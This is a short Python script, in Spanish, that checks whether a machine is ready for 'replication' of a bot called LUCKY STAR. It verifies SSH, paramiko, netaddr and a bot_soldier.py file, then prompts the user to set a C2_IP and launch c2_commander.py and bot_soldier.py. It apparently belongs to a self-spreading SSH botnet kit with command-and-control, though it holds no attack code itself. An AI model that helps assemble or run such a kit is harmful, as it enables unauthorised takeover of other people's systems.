"""Script para probar la replicación del bot localmente."""
import subprocess
import time
import os

def test_ssh_replication():
    """Prueba la replicación SSH."""
    print("="*60)
    print("  TEST DE REPLICACIÓN - LUCKY STAR")
    print("="*60)
    
    print("\n[1/5] Verificando SSH local...")
    result = subprocess.run(['ssh', '-V'], capture_output=True, text=True)
    if result.returncode != 0:
        print("[!] SSH no disponible")
        return False
    print("[+] SSH disponible")
    
    print("\n[2/5] Verificando Python...")
    result = subprocess.run(['python3', '--version'], capture_output=True, text=True)
    print(f"[+] {result.stdout.strip()}")
    
    print("\n[3/5] Verificando dependencias...")
    try:
        import paramiko
        import netaddr
        print("[+] Paramiko: OK")
        print("[+] Netaddr: OK")
    except ImportError as e:
        print(f"[!] Falta dependencia: {e}")
        return False
    
    print("\n[4/5] Verificando bot_soldier.py...")
    if not os.path.exists('bot_soldier.py'):
        print("[!] bot_soldier.py no encontrado")
        return False
    print("[+] Bot encontrado")
    
    print("\n[5/5] Estado:")
    print("    ✅ Sistema listo para replicación")
    print("    📝 Configura C2_IP en bot_soldier.py")
    print("    🚀 Ejecuta: python c2_commander.py")
    print("    🤖 Luego: python bot_soldier.py")
    
    return True

if __name__ == "__main__":
    test_ssh_replication()
